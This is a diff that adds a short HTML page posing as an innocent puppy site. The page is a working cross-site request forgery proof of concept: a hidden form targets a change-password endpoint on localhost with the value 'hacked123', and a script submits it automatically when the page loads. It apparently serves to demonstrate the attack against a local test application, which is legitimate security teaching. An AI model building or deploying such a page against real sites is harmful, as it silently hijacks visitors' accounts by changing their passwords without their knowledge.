@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <h1>Blasko's totally Innocent Website</h1>
+    <img src="https://i.imgur.com/4M7IWwP.gif" alt="puppy"><br><br>
+
+    <form action="http://localhost:5000/change-password" method="POST" id="csrfForm">
+      <input type="hidden" name="new_password" value="hacked123">
+    </form>
+
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
+
